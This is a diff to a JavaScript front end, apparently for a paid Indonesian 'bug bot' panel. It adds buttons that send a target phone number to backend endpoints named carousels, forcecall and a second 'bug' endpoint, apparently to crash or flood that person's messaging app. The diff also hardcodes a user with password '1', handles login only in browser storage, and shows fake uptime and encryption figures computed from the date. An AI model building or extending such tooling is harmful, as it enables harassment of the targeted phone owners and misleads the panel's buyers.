@@ -1,5 +1,8 @@
 // app.js
 
+// --- Konfigurasi API Backend ---
+const API_BASE_URL = 'http://localhost:5036/api/bug'; // Ganti dengan URL backend Anda jika sudah deploy!
+
 // --- DOM Element References ---
 const splashScreen = document.getElementById('splashScreen');
 const loadingBar = document.getElementById('loadingBar');
@@ -15,6 +18,11 @@ const myStatusIndicator = document.getElementById('myStatusIndicator');
 const otherUsersStatus = document.getElementById('otherUsersStatus');
 const userStatusSection = document.getElementById('userStatusSection'); 
 
+// Stats elements
+const uptimeValue = document.getElementById('uptimeValue');
+const supportValue = document.getElementById('supportValue');
+const encryptionValue = document.getElementById('encryptionValue');
+
 // Payment Slide Elements
 const openPaymentSlideButton = document.getElementById('openPaymentSlide');
 const closePaymentSlideButton = document.getElementById('closePaymentSlide');
@@ -25,6 +33,22 @@ const openSosmedSlideButton = document.getElementById('openSosmedSlide');
 const closeSosmedSlideButton = document.getElementById('closeSosmedSlide');
 const socialMediaSlide = document.getElementById('socialMediaSlide');
 
+// Bug Panel Elements
+const openBugSlideButton = document.getElementById('openBugSlide');
+const closeBugSlideButton = document.getElementById('closeBugSlide');
+const bugSlide = document.getElementById('bugSlide');
+const botStatusElement = document.getElementById('botStatus');
+const bugNoInput = document.getElementById('bugNoInput');
+const sendPairingCodeButton = document.getElementById('sendPairingCode');
+const sendNoTargetButton = document.getElementById('sendNoTarget');
+const toggleDelayButton = document.getElementById('toggleDelay');
+const delayStatusElement = document.getElementById('delayStatus');
+const triggerFCButton = document.getElementById('triggerFC');
+const targetOsRadios = document.querySelectorAll('input[name="targetOs"]');
+
+// Logout Button
+const logoutButton = document.getElementById('logoutButton');
+
 // Other global elements
 const themeToggle = document.querySelector('.theme-toggle');
 const body = document.body;
@@ -33,7 +57,6 @@ const gatewayAudio = document.getElementById('gatewayAudio');
 
 // --- Global Variables ---
 let isLoginMode = true; // State for login/register form
-// Load registered users from localStorage, or initialize with 'annas'
 const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || {}; 
 
 // Ensure 'annas' user exists with specific ID, or update if password changed
@@ -43,6 +66,12 @@ if (!registeredUsers['annas'] || registeredUsers['annas'].password !== '1' || re
 }
 
 let currentUserId = null; // To store logged-in user's ID
+let currentUsername = null; // To store current username for auto-login
+let otherUsersStatusInterval = null; // Keep track of the interval for clearing
+
+// Bug Panel State (Simulated on frontend, would be real-time from backend)
+let isBotOnline = false; // Initial bot status, will be random on login
+let isDelayActive = false;
 
 
 // --- Helper Functions ---
@@ -54,10 +83,10 @@ let currentUserId = null; // To store logged-in user's ID
  */
 function generateUniqueId() {
     let id;
-    const existingIds = Object.values(registeredUsers).map(user => user.id);
+    const allRegisteredIds = Object.values(registeredUsers).map(user => user.id);
     do {
         id = Math.floor(10000000 + Math.random() * 90000000);
-    } while (existingIds.includes(id));
+    } while (allRegisteredIds.includes(id) || id === currentUserId);
     return id;
 }
 
@@ -81,11 +110,30 @@ function updateOtherUsersStatus() {
     
     let otherId;
     do {
-        otherId = generateUniqueId(); 
-    } while (otherId === currentUserId); // Make sure it's not the same as logged-in user's ID
+        otherId = Math.floor(10000000 + Math.random() * 90000000); 
+    } while (otherId === currentUserId); 
 
     if (otherUsersStatus) {
         otherUsersStatus.textContent = `${randomStatus} (ID: ${otherId})`;
+    }
+}
+
+/**
+ * Updates dynamic stats (Uptime, Support, Encryption) based on current date.
+ */
+function updateDynamicStats() {
+    const today = new Date();
+    const dayOfMonth = today.getDate();
+
+    if (uptimeValue) {
+        uptimeValue.textContent = `99.${(dayOfMonth % 10) + 9}%`; 
+    }
+    if (supportValue) {
+        supportValue.textContent = `${(dayOfMonth % 3) + 2}4/7`;
+    }
+    if (encryptionValue) {
+        const strengths = ['256-bit', '512-bit', '384-bit'];
+        encryptionValue.textContent = strengths[dayOfMonth % strengths.length];
     }
 }
 
@@ -156,6 +204,91 @@ function createParticles() {
     }
 }
 
+/**
+ * Handles successful login: shows main content, sets user status, plays audio.
+ * @param {string} username - The username of the logged-in user.
+ * @param {number} userId - The ID of the logged-in user.
+ */
+function handleLoginSuccess(username, userId) {
+    showToast('Berhasil!', `Selamat datang, ${username}!`, 'success');
+    currentUserId = userId;
+    currentUsername = username; // Store for auto-login
+    localStorage.setItem('loggedInUser', JSON.stringify({ username: username, id: userId })); // Save login session
+
+    if (myUserIdElement) myUserIdElement.textContent = currentUserId; 
+    if (userStatusSection) {
+        userStatusSection.style.display = 'flex'; 
+        setTimeout(() => {
+            userStatusSection.classList.add('visible'); 
+        }, 50); 
+    }
+    
+    if (loginRegisterContainer) loginRegisterContainer.classList.remove('active'); 
+    if (mainContent) mainContent.style.display = 'block'; 
+    setMyStatus('online'); 
+    updateDynamicStats(); // Update stats on login
+    if (gatewayAudio) gatewayAudio.play().catch(e => console.error("Audio play failed:", e)); 
+    if (!otherUsersStatusInterval) { 
+        otherUsersStatusInterval = setInterval(updateOtherUsersStatus, 5000); 
+    }
+    // Set bot status randomly on login
+    isBotOnline = Math.random() < 0.7; // 70% chance to be online
+    updateBotStatusDisplay();
+}
+
+/**
+ * Handles user logout.
+ */
+function handleLogout() {
+    localStorage.removeItem('loggedInUser'); // Clear login session
+    currentUserId = null;
+    currentUsername = null;
+
+    if (userStatusSection) {
+        userStatusSection.classList.remove('visible');
+        setTimeout(() => {
+            userStatusSection.style.display = 'none'; // Hide after fade out
+        }, 500); 
+    }
+    if (mainContent) mainContent.style.display = 'none'; 
+    if (loginRegisterContainer) loginRegisterContainer.classList.add('active'); // Show login form again
+    setMyStatus('idle'); // Set status back to idle
+    showToast('Berhasil!', 'Anda telah logout.', 'info');
+    if (otherUsersStatusInterval) { 
+        clearInterval(otherUsersStatusInterval);
+        otherUsersStatusInterval = null;
+    }
+    // Reset bot status on logout
+    isBotOnline = false;
+    isDelayActive = false;
+    updateBotStatusDisplay();
+    if (delayStatusElement) delayStatusElement.classList.remove('active'); 
+    if (delayStatusElement) delayStatusElement.textContent = 'OFF';
+}
+
+/**
+ * Updates the display of bot status.
+ */
+function updateBotStatusDisplay() {
+    if (botStatusElement) {
+        botStatusElement.textContent = isBotOnline ? 'Online' : 'Offline';
+        botStatusElement.classList.remove('status-online', 'status-offline');
+        botStatusElement.classList.add(isBotOnline ? 'status-online' : 'status-offline');
+    }
+}
+
+/**
+ * Validates a given phone number.
+ * Simple validation: starts with 62, minimum 10 digits, max 15.
+ * @param {string} number - The phone number to validate.
+ * @returns {boolean}
+ */
+function isValidPhoneNumber(number) {
+    // Basic validation for Indonesian numbers
+    const regex = /^62[0-9]{8,13}$/; // Starts with 62, 8-13 more digits
+    return regex.test(number);
+}
+
 
 // --- Event Listeners and Main Logic ---
 
@@ -169,7 +302,11 @@ window.addEventListener('load', () => {
         body.setAttribute('data-theme', 'dark'); 
     }
     
-    createParticles(); // Create dynamic particles
+    createParticles(); 
+    updateDynamicStats(); 
+    setInterval(updateDynamicStats, 24 * 60 * 60 * 1000); // Update daily
+
+    const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
 
     // Simulate loading bar progress
     let progress = 0;
@@ -181,22 +318,27 @@ window.addEventListener('load', () => {
             // After loading bar is full, start splash screen fade out
             setTimeout(() => {
                 if (splashScreen) {
-                    splashScreen.classList.add('hidden'); // Start fade-out animation
+                    splashScreen.classList.add('hidden'); 
                 }
                 setTimeout(() => {
                     if (splashScreen) {
-                        splashScreen.style.display = 'none'; // Hide completely after fade-out
+                        splashScreen.style.display = 'none'; 
                     }
-                    if (loginRegisterContainer) {
-                        loginRegisterContainer.classList.add('active'); // Show login/register form
+                    if (loggedInUser && registeredUsers[loggedInUser.username] && registeredUsers[loggedInUser.username].id === loggedInUser.id) {
+                        // If logged in, skip login form
+                        handleLoginSuccess(loggedInUser.username, loggedInUser.id);
+                    } else {
+                        // Otherwise, show login form
+                        if (loginRegisterContainer) {
+                            loginRegisterContainer.classList.add('active'); 
+                        }
                     }
-                }, 1000); // Wait for fade-out animation to complete (matching CSS transition)
-            }, 500); // Small delay after loading bar fills up
+                }, 1000); // Wait for fade-out animation
+            }, 500); 
         }
-    }, 100); // Update loading bar every 100ms for 1 second total
+    }, 100); 
 
-    // Start updating other users' status periodically
-    setInterval(updateOtherUsersStatus, 5000); 
+    otherUsersStatusInterval = setInterval(updateOtherUsersStatus, 5000);
 });
 
 
@@ -227,22 +369,7 @@ if (authButton) {
         if (isLoginMode) {
             // --- Simulate Login ---
             if (registeredUsers[username] && registeredUsers[username].password === password) {
-                showToast('Berhasil!', 'Login berhasil!', 'success');
-                currentUserId = registeredUsers[username].id;
-                
-                if (myUserIdElement) myUserIdElement.textContent = currentUserId; 
-                if (userStatusSection) {
-                    userStatusSection.style.display = 'flex'; // Ensure display is flex for animation
-                    // Use a timeout to allow display change to register before opacity transition
-                    setTimeout(() => {
-                        userStatusSection.classList.add('visible'); // Add class for fade-in
-                    }, 50); 
-                }
-                
-                if (loginRegisterContainer) loginRegisterContainer.classList.remove('active'); 
-                if (mainContent) mainContent.style.display = 'block'; 
-                setMyStatus('online'); 
-                if (gatewayAudio) gatewayAudio.play().catch(e => console.error("Audio play failed:", e)); 
+                handleLoginSuccess(username, registeredUsers[username].id);
             } else {
                 showToast('Gagal', 'Username atau password salah!', 'error');
             }
@@ -251,12 +378,12 @@ if (authButton) {
             if (registeredUsers[username]) {
                 showToast('Gagal', 'Username sudah terdaftar. Gunakan nama lain.', 'error');
             } else {
-                const newUserId = generateUniqueId();
+                // Ensure 'annas' is always 12345678, others get random
+                const newUserId = (username === 'annas' && password === '1') ? 12345678 : generateUniqueId();
                 registeredUsers[username] = { password: password, id: newUserId };
                 localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers)); 
                 showToast('Berhasil!', 'Akun berhasil dibuat! Silakan login.', 'success');
                 
-                // Reset form to login mode
                 if (usernameInput) usernameInput.value = '';
                 if (passwordInput) passwordInput.value = '';
                 isLoginMode = true; 
@@ -300,8 +427,126 @@ if (closeSosmedSlideButton) {
     });
 }
 
+// 5. Bug Panel Logic
+if (openBugSlideButton) {
+    openBugSlideButton.addEventListener('click', () => {
+        if (bugSlide) bugSlide.classList.add('active');
+        if (body) body.classList.add('payment-slide-active'); // Re-use class for blocking scroll
+        updateBotStatusDisplay(); // Update status when panel opens
+    });
+}
 
-// 5. Theme Toggle Logic
+if (closeBugSlideButton) {
+    closeBugSlideButton.addEventListener('click', () => {
+        if (bugSlide) bugSlide.classList.remove('active');
+        if (body) body.classList.remove('payment-slide-active');
+    });
+}
+
+if (sendPairingCodeButton) {
+    sendPairingCodeButton.addEventListener('click', async () => {
+        if (!isBotOnline) {
+            showToast('Bot Offline', 'Bot tidak online untuk mengirim kode pairing.', 'error');
+            return;
+        }
+        const targetNo = bugNoInput ? bugNoInput.value.trim() : '';
+        if (!isValidPhoneNumber(targetNo)) {
+            showToast('Invalid Number', 'Nomor target tidak valid. Gunakan format 62xxxxxx.', 'warning');
+            return;
+        }
+        const selectedOs = document.querySelector('input[name="targetOs"]:checked');
+        const osValue = selectedOs ? selectedOs.value : 'unknown';
+        
+        showToast('Processing...', `Mengirim kode pairing ke ${targetNo} (${osValue})...`, 'info');
+        try {
+            // KIRIM PERMINTAAN KE BACKEND
+            const response = await fetch(`${API_BASE_URL}/carousels?target=${targetNo}&fjids=${osValue}`); // Menggunakan carousels sebagai contoh API pairing
+            const data = await response.json();
+            if (data.status) {
+                showToast('Bug Sent!', `Kode Pairing berhasil dikirim ke ${targetNo}!`, 'success');
+            } else {
+                showToast('Bug Failed', `Gagal mengirim kode pairing: ${data.message || 'Unknown error'}`, 'error');
+            }
+        } catch (error) {
+            showToast('Connection Error', `Tidak dapat terhubung ke server bot: ${error.message}`, 'error');
+            console.error("Fetch error:", error);
+        }
+    });
+}
+
+if (sendNoTargetButton) {
+    sendNoTargetButton.addEventListener('click', async () => {
+        if (!isBotOnline) {
+            showToast('Bot Offline', 'Bot tidak online untuk mengirim tanpa target.', 'error');
+            return;
+        }
+        showToast('Processing...', 'Mengirim tanpa nomor target...', 'info');
+        try {
+            // KIRIM PERMINTAAN KE BACKEND (contoh API fiktif)
+            const response = await fetch(`${API_BASE_URL}/some_other_bug_endpoint`); 
+            const data = await response.json();
+            if (data.status) {
+                showToast('Bug Sent!', 'Perintah tanpa target berhasil dikirim!', 'success');
+            } else {
+                showToast('Bug Failed', `Gagal mengirim perintah tanpa target: ${data.message || 'Unknown error'}`, 'error');
+            }
+        } catch (error) {
+            showToast('Connection Error', `Tidak dapat terhubung ke server bot: ${error.message}`, 'error');
+            console.error("Fetch error:", error);
+        }
+    });
+}
+
+if (toggleDelayButton) {
+    toggleDelayButton.addEventListener('click', () => {
+        if (!isBotOnline) {
+            showToast('Bot Offline', 'Bot tidak online untuk mengubah delay.', 'error');
+            return;
+        }
+        isDelayActive = !isDelayActive;
+        if (delayStatusElement) {
+            delayStatusElement.textContent = isDelayActive ? 'ON' : 'OFF';
+            delayStatusElement.classList.toggle('active', isDelayActive);
+        }
+        showToast('Delay Status', `Delay bot sekarang ${isDelayActive ? 'AKTIF' : 'NONAKTIF'}.`, 'info');
+    });
+}
+
+if (triggerFCButton) {
+    triggerFCButton.addEventListener('click', async () => {
+        if (!isBotOnline) {
+            showToast('Bot Offline', 'Bot tidak online untuk trigger FC.', 'error');
+            return;
+        }
+        const targetNo = bugNoInput ? bugNoInput.value.trim() : '';
+        if (!isValidPhoneNumber(targetNo)) {
+            showToast('Invalid Number', 'Nomor target tidak valid. Gunakan format 62xxxxxx.', 'warning');
+            return;
+        }
+        showToast('Processing...', `Mengirim perintah FC ke ${targetNo}...`, 'info');
+        try {
+            // KIRIM PERMINTAAN KE BACKEND
+            const response = await fetch(`${API_BASE_URL}/forcecall?target=${targetNo}`); 
+            const data = await response.json();
+            if (data.status) {
+                showToast('Bug Sent!', `Perintah FC berhasil dikirim ke ${targetNo}!`, 'success');
+            } else {
+                showToast('Bug Failed', `Gagal mengirim perintah FC: ${data.message || 'Unknown error'}`, 'error');
+            }
+        } catch (error) {
+            showToast('Connection Error', `Tidak dapat terhubung ke server bot: ${error.message}`, 'error');
+            console.error("Fetch error:", error);
+        }
+    });
+}
+
+// 6. Logout Logic
+if (logoutButton) {
+    logoutButton.addEventListener('click', handleLogout);
+}
+
+
+// 7. Theme Toggle Logic
 if (themeToggle) {
     themeToggle.addEventListener('click', () => {
         const currentTheme = body.getAttribute('data-theme');
@@ -312,7 +557,7 @@ if (themeToggle) {
     });
 }
 
-// 6. Copy Button Logic for payment methods
+// 8. Copy Button Logic for payment methods
 document.querySelectorAll('.copy-button').forEach(button => {
     button.addEventListener('click', () => {
         const textToCopy = button.dataset.copy;
@@ -329,7 +574,7 @@ document.querySelectorAll('.copy-button').forEach(button => {
     });
 });
 
-// 7. Status Toggle Logic (Dana, GoPay, OVO)
+// 9. Status Toggle Logic (Dana, GoPay, OVO)
 document.querySelectorAll('.status-toggle').forEach(button => {
     button.addEventListener('click', () => {
         const paymentCard = button.closest('.payment-card');
@@ -362,7 +607,7 @@ document.querySelectorAll('.status-toggle').forEach(button => {
     });
 });
 
-// 8. Download QRIS Logic (placeholder)
+// 10. Download QRIS Logic (placeholder)
 const downloadQrisButton = document.getElementById('downloadQris');
 if (downloadQrisButton) {
     downloadQrisButton.addEventListener('click', () => {
